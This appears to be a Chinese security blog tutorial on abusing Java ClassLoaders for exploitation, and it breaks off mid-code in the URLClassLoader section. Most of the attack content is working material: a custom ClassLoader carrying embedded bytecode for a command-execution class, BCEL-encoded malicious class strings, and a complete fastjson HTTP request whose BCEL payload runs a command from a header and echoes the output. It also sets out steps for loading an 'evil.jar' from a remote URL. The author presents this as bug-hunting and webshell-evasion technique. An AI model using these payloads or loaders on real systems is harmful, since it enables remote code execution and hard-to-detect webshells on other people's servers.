
# 0x01 前提

为啥要搞这个？



1、挖洞

```
比如挖洞的时候遇到反序列化，一般都是cc回显是将构造的回显类塞进TemplatesImpl中，如果禁用了就得找其他的方法，一般都是找ClassLoader的子类，并且实现defineClass的类。
```

2、webshell对抗

```
类似于冰蝎的webshell也是使用自定义的ClassLoader，下面讲的方法都可以转化为webshell，这种特征都不台明显，有一定的迷惑性。
```

3、漏洞利用

```
还是在漏洞回显方面的问题，一般多利用 TemplatesImpl 和BECL 可以直接塞入payload直接攻击，比如常见的fastjson
```





# 0x01 Java类基本使用

Java是编译型语言

Java是一个底层是一个`JVM`（Java虚拟机）驱动实现的跨平台的开发语言。

1、Java程序在运行前需要先编译成`class文件`。

2、Java类初始化的时候会调用`java.lang.ClassLoader`加载类字节码

3、`ClassLoader`会调用JVM（`defineClass0/defineClass1/defineClass2`）native方法来定义一个实例。

（native方法就是本地方法，底层是C写的了，我们在代码层就看不到了）

![image-20220509115045243](https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202205091150334.png)



## ClassLoader

一切的Java类都必须经过JVM加载后才能运行，而`ClassLoader`的主要作用就是Java类文件的加载。

`ClassLoader`类有如下核心方法：

1. `loadClass`（加载指定的Java类）
2. `findClass`（查找指定的Java类）
3. `findLoadedClass`（查找JVM已经加载过的类）
4. `defineClass`（定义一个Java类）
5. `resolveClass`（链接指定的Java类）

## ClassLoader类加载流程

> 引用园长的文章，写的很好了：
>
> 理解Java类加载机制并非易事，这里我们以一个Java的HelloWorld来学习`ClassLoader`。
>
> `ClassLoader`加载`com.anbai.sec.classloader.TestHelloWorld`类重要流程如下：
>
> 1. `ClassLoader`会调用`public Class<?> loadClass(String name)`方法加载`com.anbai.sec.classloader.TestHelloWorld`类。
> 2. 调用`findLoadedClass`方法检查`TestHelloWorld`类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。
> 3. 如果创建当前`ClassLoader`时传入了父类加载器（`new ClassLoader(父类加载器)`）就使用父类加载器加载`TestHelloWorld`类，否则使用JVM的`Bootstrap ClassLoader`加载。
> 4. 如果上一步无法加载`TestHelloWorld`类，那么调用自身的`findClass`方法尝试加载`TestHelloWorld`类。
> 5. 如果当前的`ClassLoader`没有重写了`findClass`方法，那么直接返回类加载失败异常。如果当前类重写了`findClass`方法并通过传入的`com.anbai.sec.classloader.TestHelloWorld`类名找到了对应的类字节码，那么应该调用`defineClass`方法去JVM中注册该类。
> 6. 如果调用loadClass的时候传入的`resolve`参数为true，那么还需要调用`resolveClass`方法链接类，默认为false。
> 7. 返回一个被JVM加载后的`java.lang.Class`类对象。

# 0x02 自定义ClassLoader

## 自定义ClassLoader

`java.lang.ClassLoader`是所有的类加载器的父类，所以我们要实现一个自定义的`ClassLoader`加载器就可以直接继承就好。然后重写了`findClass`或`defineClass`者方法就好了

下面写一个自定义加载器实现命令执行。

首先写一个简单的命令执行方法：

```java
package com.classloader;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class Command {
	public BufferedReader execute(String args) {
		String command = args;
	 	String osName  = System.getProperty("os.name");
//
	 	if (osName.startsWith("Windows")) {
			 command = "calc";
		 }
		 else if (osName.startsWith("Linux")) {
	  			command = "curl dnslog.com";
		 }else {
			try {
				Process process = Runtime.getRuntime().exec(command);
				// 获取命令执行结果
				InputStream in = process.getInputStream();
				//取得命令结果的输出流
				InputStream inputStream = process.getInputStream();
				//用一个读输出流类去读
				InputStreamReader isr = new InputStreamReader(inputStream, StandardCharsets.UTF_8);
				//用缓冲器读行
				BufferedReader br = new BufferedReader(isr);

				return br;

			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		return null;
	}

}
```

实验时要注意，测试的时候要把写好的Command代码都注释了再进行类加载。

因为如果这个类存在于我们的`classpath`中，就会直接调用了，不会进入我们的自定义类加载器中！

只有注释了，这个类不存在了才会进入自定义类加载器重写`findClass`方法，然后在调用`defineClass`方法，然后去调用native方法加载这个传入的类。

下面是例示代码

**ZeoClassLoader示例代码：**

```java
package com.classloader;

import java.io.BufferedReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class ZeoClassLoader extends ClassLoader {

    // 要加载的类名
    public static String TEST_CLASS_NAME = "com.classloader.Command";

    // 要加载的类字节码
    public static byte[] TEST_CLASS_BYTES = new byte[]{
            -54, -2, -70, -66, 0, 0, 0, 52, 0, 96, 10, 0, 20, 0, 51, 8, 0, 52, 10, 0, 53, 0, 54, 8, 0, 55, 10, 0, 56, 0, 57, 8, 0, 58, 8, 0, 59, 8, 0, 60, 10, 0, 61, 0, 62, 10, 0, 61, 0, 63, 10, 0, 64, 0, 65, 7, 0, 66, 9, 0, 67, 0, 68, 10, 0, 12, 0, 69, 7, 0, 70, 10, 0, 15, 0, 71, 7, 0, 72, 10, 0, 17, 0, 73, 7, 0, 74, 7, 0, 75, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 25, 76, 99, 111, 109, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 67, 111, 109, 109, 97, 110, 100, 59, 1, 0, 7, 101, 120, 101, 99, 117, 116, 101, 1, 0, 44, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 7, 112, 114, 111, 99, 101, 115, 115, 1, 0, 19, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 2, 105, 110, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 11, 105, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 3, 105, 115, 114, 1, 0, 27, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 59, 1, 0, 2, 98, 114, 1, 0, 24, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 4, 97, 114, 103, 115, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 7, 99, 111, 109, 109, 97, 110, 100, 1, 0, 6, 111, 115, 78, 97, 109, 101, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 76, 7, 0, 72, 1, 0, 16, 77, 101, 116, 104, 111, 100, 80, 97, 114, 97, 109, 101, 116, 101, 114, 115, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 12, 67, 111, 109, 109, 97, 110, 100, 46, 106, 97, 118, 97, 12, 0, 21, 0, 22, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 77, 12, 0, 78, 0, 79, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 76, 12, 0, 80, 0, 81, 1, 0, 22, 99, 97, 108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 1, 0, 5, 76, 105, 110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 57, 57, 57, 57, 47, 7, 0, 82, 12, 0, 83, 0, 84, 12, 0, 85, 0, 86, 7, 0, 87, 12, 0, 88, 0, 89, 1, 0, 25, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 7, 0, 90, 12, 0, 91, 0, 92, 12, 0, 21, 0, 93, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 12, 0, 21, 0, 94, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 95, 0, 22, 1, 0, 23, 99, 111, 109, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 67, 111, 109, 109, 97, 110, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 33, 106, 97, 118, 97, 47, 110, 105, 111, 47, 99, 104, 97, 114, 115, 101, 116, 47, 83, 116, 97, 110, 100, 97, 114, 100, 67, 104, 97, 114, 115, 101, 116, 115, 1, 0, 5, 85, 84, 70, 95, 56, 1, 0, 26, 76, 106, 97, 118, 97, 47, 110, 105, 111, 47, 99, 104, 97, 114, 115, 101, 116, 47, 67, 104, 97, 114, 115, 101, 116, 59, 1, 0, 50, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 76, 106, 97, 118, 97, 47, 110, 105, 111, 47, 99, 104, 97, 114, 115, 101, 116, 47, 67, 104, 97, 114, 115, 101, 116, 59, 41, 86, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 82, 101, 97, 100, 101, 114, 59, 41, 86, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101, 0, 33, 0, 19, 0, 20, 0, 0, 0, 0, 0, 2, 0, 1, 0, 21, 0, 22, 0, 1, 0, 23, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 24, 0, 0, 0, 6, 0, 1, 0, 0, 0, 9, 0, 25, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 26, 0, 27, 0, 0, 0, 1, 0, 28, 0, 29, 0, 2, 0, 23, 0, 0, 1, 61, 0, 4, 0, 9, 0, 0, 0, 98, 43, 77, 18, 2, -72, 0, 3, 78, 45, 18, 4, -74, 0, 5, -103, 0, 9, 18, 6, 77, -89, 0, 76, 45, 18, 7, -74, 0, 5, -103, 0, 9, 18, 8, 77, -89, 0, 61, -72, 0, 9, 44, -74, 0, 10, 58, 4, 25, 4, -74, 0, 11, 58, 5, 25, 4, -74, 0, 11, 58, 6, -69, 0, 12, 89, 25, 6, -78, 0, 13, -73, 0, 14, 58, 7, -69, 0, 15, 89, 25, 7, -73, 0, 16, 58, 8, 25, 8, -80, 58, 4, 25, 4, -74, 0, 18, 1, -80, 0, 1, 0, 38, 0, 88, 0, 89, 0, 17, 0, 3, 0, 24, 0, 0, 0, 62, 0, 15, 0, 0, 0, 11, 0, 2, 0, 12, 0, 8, 0, 14, 0, 17, 0, 15, 0, 23, 0, 17, 0, 32, 0, 18, 0, 38, 0, 21, 0, 47, 0, 23, 0, 54, 0, 25, 0, 61, 0, 27, 0, 75, 0, 29, 0, 86, 0, 31, 0, 89, 0, 33, 0, 91, 0, 34, 0, 96, 0, 38, 0, 25, 0, 0, 0, 102, 0, 10, 0, 47, 0, 42, 0, 30, 0, 31, 0, 4, 0, 54, 0, 35, 0, 32, 0, 33, 0, 5, 0, 61, 0, 28, 0, 34, 0, 33, 0, 6, 0, 75, 0, 14, 0, 35, 0, 36, 0, 7, 0, 86, 0, 3, 0, 37, 0, 38, 0, 8, 0, 91, 0, 5, 0, 39, 0, 40, 0, 4, 0, 0, 0, 98, 0, 26, 0, 27, 0, 0, 0, 0, 0, 98, 0, 41, 0, 42, 0, 1, 0, 2, 0, 96, 0, 43, 0, 42, 0, 2, 0, 8, 0, 90, 0, 44, 0, 42, 0, 3, 0, 45, 0, 0, 0, 17, 0, 4, -3, 0, 23, 7, 0, 46, 7, 0, 46, 14, 114, 7, 0, 47, 6, 0, 48, 0, 0, 0, 5, 1, 0, 41, 0, 0, 0, 1, 0, 49, 0, 0, 0, 2, 0, 50
    };

    @Override
    public Class<?> findClass(String name) throws ClassNotFoundException {
        // 只处理 x类
        if (name.equals(TEST_CLASS_NAME)) {
            // 调用JVM的native去加载 x类
            return defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
        }

        return super.findClass(name);
    }

    public static void main(String[] args) {
        // 创建自定义的classloader
        ZeoClassLoader loader = new ZeoClassLoader();

        try {
            // 使用自定义的类加载器加载x类
            Class testClass = loader.loadClass(TEST_CLASS_NAME);

            // 获取构造方法
            Constructor constructor = testClass.getDeclaredConstructor();
            constructor.setAccessible(true);

            // 反射实例化，等价于 Command t = new Command();
            Object runtimeInstance = constructor.newInstance();

            // 反射获取 execute 方法
            Method method = testClass.getMethod("execute", String.class);

            // 反射调用 execute 方法, 等价于 t.execute(cmd);
            BufferedReader br = (BufferedReader) method.invoke(runtimeInstance, "whoami");

            // 读取结果
            String line=null;
            while ((line=br.readLine())!=null){
                System.out.println(line);
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

```

![image-20220509160331973](https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202205091603010.png)



再然后就









# 0x03 BCEL

##  BCEL ClassLoader

[BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库。

BCEL的类加载器在解析类名时，会对ClassName中有`$$BCEL$$`标识的类名做特殊处理，导致恶意加载类。

### BCEL攻击原理

当BCEL的加载一个类名中带有`$$BCEL$$`的类时，会截取出前面的`$$BCEL$$`后面的字符串，然后使用`com.sun.org.apache.bcel.internal.classfile.Utility#decode`这个方法把后面的将字符串解析成类字节码，所以我们可以把恶意类转化成这种形式，最后会调用`defineClass`加载恶意类，达到攻击效果



## BCEL版本

Oracle JDK引用了BCEL库，不过修改了原包名

`org.apache.bcel.util.ClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`

适用于BCEL 6.0以下

DK版本为：`JDK1.5 - 1.7`、`JDK8 - JDK8u241`、`JDK9`。



## 利用示例

写个命令执行的方法看看

利用BCELClassLoader加载恶意类，实现命令执行

```java
package com.bcel;

import org.apache.bcel.classfile.Utility;
import org.apache.bcel.util.ClassLoader;


public class BCELClassLoader {


    public static void bcel() throws Exception {

        // 创建BCEL类加载器
        ClassLoader classLoader = new ClassLoader();

        // BCEL编码类字节码
        String className = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85TmS$hU$Y$3d$97$bc$ec$b2$y$q$qB$J$f5$r$a8m$D$b4$89$d6jk$8a$a8$8dE$90$A5$a1P$daj$e7fs$L$5b7$bb$99$dd$8d$d2$9f$e2$_$e8$e7$fa$B$3av$c6$l$e0$3f$f2$83$8eg$93$94$UI$c7L$e6$d9$7d$ce$f3$7e$9e$bb$f7$cf$7f$7e$ff$D$c05$3c20$85$8fu$5c$d5$f1$89A$fdS$j$9f$Z$b8$8e$h$3a$3e$d7Q$d6q$d3$c0$S$be$88$c4$b2$81$_$f1$95$86$afGq$L$V$D$e3$f8F$c3m$Di$ach$f8$d6$40$G$ab$g$d64$7c$t$90$5c$b2$5d$3b$5c$W$88$V$e6w$E$e2$V$af$a9$ERU$dbU$9b$9dVC$f9$db$b2$e1$Q$c9T$3dK$3a$3b$d2$b7$p$bd$P$c6$c3$D$3b$88l$96$d7$w5$y$e5$94$w$5e$ab$r$dd$e6M$B$7d$c9r$fa$a9$b5$b6$efY$w$a0g$b6$faD$fe$yK$8et$f7Kwz$m$5dGlW$60$aag$b2$bd$d2$9a$db$ee$84$f5$d0W$b2E$e3$98$3dP$d9$a5$j$f8$C$e7$87$f9$d6$94l$w$3fJ$d7$a0$cb$cc$89$cb$ad$ce$e3$c7$caW$cd$T$bbP$a7$aam$dd$3e$b4T$3b$b4$3d$976$cd$ea$N$Q$N5h$95$Flw$9f$e6$a4$Xl$ca$W$e3$c7$eb$a1$b4$7e$da$90$ed$$$T$g$d6$c9$ab$80Q$f7$3a$be$a5V$ec$88$i$b3$cfE1$cacb$g$e7$E$a6$bd$b6r$f3Wd$be$o$j$ab$e3$c8$d0$f3$8b$b2$ddf$5d$_$u$ba$cc$ac$a1jb$D$9bDvm$b7$e9$fd$S0$b7$89$z$dc$n$db$5c$80$r$90$e0n$3a$87$Ci$ab$e3$3b$f9$a6$h8$de$7e1Z$80$86$efM$d4P7$b1$8d$bb$gvL$ec$e2$9e$40$ee$8d$5ci$d83q$l$P$a2$e6$k$b2$b9$e1$8cE$d6$l$b8$ba$n$84$99$f81$9a$w$fd$df$f5$T$g$90$b7$d5x$a2$ac$f0$U$d4$e3$f34$f44$I$V$X$3c$b6$afB$9e$8c$b6$f2$c3$a7$C$X$Lg$b70$3fl1F$QJ$3f$Mv$ed$f0$80$cb$j$Wu_$60r$80$d6$3anhG$8b4X$efD$99$w$bc$9e$bc$P3$7b$5c$j$w2$7f$e9$7f$ba$Z$9c$e8$c93$a0$c0$E$x$ad$bd$7e$96$cf$bd$aav$e6$cc$cfua$97$b8u$m$fd$40$85$acFZ$a5$df$ac$f4t$a6K$dc$dd$5eytC$60$b6z$c6$b9$ef$c4DW$LC$x$bc9$q$ba$D$b2$83$a0$fe7$T$a1$a96$e7$N$bb$c7$7e$db$97$96$c2$i$de$e2$85$U$fdF$m$a2$e3M9C$ad$c4$a7$e03$b1p$M$f1$bck$ceQ$s$bb$e0$uf$v$cd$9e$D$ce$e3m$3eu$bc$f3$wX$5c$40$i$g$b1$87$99$91$f5L$ec$F$e2$d5$c5L$e2$I$c9_1$9a$d1$d6$9fae1$a3$f7$d5Q$aa$d7_$c0X8$c2$d8$c6$e5$p$98$9b$91$u$c7_b$7c$_$X$ff$N$T$c7H$95$T$_$91$de$cb$r$8e1YN$3e$83$k$f9e$9f$b3$d6$r$d4$b1$c3$7b0$d6$edm$Z$v$ca1j$e3$ec0E$3c$cdn2$i1K$cfi$8e4$c3$Lw$We$f6$bb$8aw$Z$fb$3e$a3$f3$fc$be$e6$f0$A$X$bb3$d58G$J$l$d2$fa$k$t$beF$99$a75$c6$98$i$bd$e78$d7$w$x$7c$40$8f$E$e3$81$L$8cK2C$9c$V$K$8c$88$e1$k$e6$b1$d0$e5$a8$86E$be$J$5c$a6$96E$fco$cch$b8$c2$ff$84$ab$a1$f8$XC$EKE$c4$7e$f4$_$af$pH$dd$k$G$A$A";
        Class<?> clazz = Class.forName(className, true, classLoader);

        System.out.println(clazz);
    }

    public static void main(String[] args) throws Exception {
        bcel();
    }

}
```

成功执行

![image-20220509170903092](https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202205091709177.png)







# 0x04 BCEL Fastjson 应用



在fastjson中主要是通过 `org.apache.commons.dbcp.BasicDataSource`类来出发BECL的类加载器

首先发送payload：

![image-20220509191509212](https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202205091915315.png)

1、FastJson自动调用setter方法修改`org.apache.commons.dbcp.BasicDataSource`类的`driverClassName`和`driverClassLoader`值

```
其中
driverClassName 是经过BCEL编码后的类字节码 
driverClassLoader 是一个由FastJson创建的org.apache.bcel.util.ClassLoader 实例。
```

在自动setter之后，并没有触发漏洞，只是注入了类名和类加载器。

导致命令执行就在于FastJson会自动调用getter方法的`getConnection()`方法

`org.apache.commons.dbcp.BasicDataSource`本没有`connection`成员变量，但有一个`getConnection()`方法

当`getConnection()`方法被调用时就会使用注入进来的`org.apache.bcel.util.ClassLoader`类加载器加载注入进来恶意类字节码

命令执行带回显

```
POST / HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
cmd: whoami
Content-Length: 3651

{
    "xx":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
            }
        } : "xxx"
    }
}
```

![image-20220509173521483](https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202205091735548.png)



# 0x05 URLclassloader



## URLClassLoader

`URLClassLoader`继承了`ClassLoader`的一个子类

`URLClassLoader`一看名字就是知道可以远程加载，在漏洞利用的时候可以加载远程的jar来实现远程的类方法调用。



## 利用示例：

编译打包jar：

```
javac Evil.java
jar -cvf evil.jar Evil.class
```

恶意类：

```java
//注意这里可以不使用包名
//

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Evil {
    String res;

    public Evil() {
    }

    public static String exec(String var0) throws IOException {
        StringBuilder var1 = new StringBuilder();
        BufferedReader var2 = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(var0).getInputStream()));

        String var3;
        while((var3 = var2.readLine()) != null) {
            var1.append(var3).append("\n");
        }

        return var1.toString();
    }

    public String toString() {
        return this.res;
    }
}

```

起一个http服务，把jar放上去，保证可以远程请求到

```java
package com.urlclassloader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;

public class URLClassLoader {

    public static void main(String[] args) {
        try {
            // 定义远程加载的jar路径
            URL url = new URL("http://127.0.0.1/evil.jar");

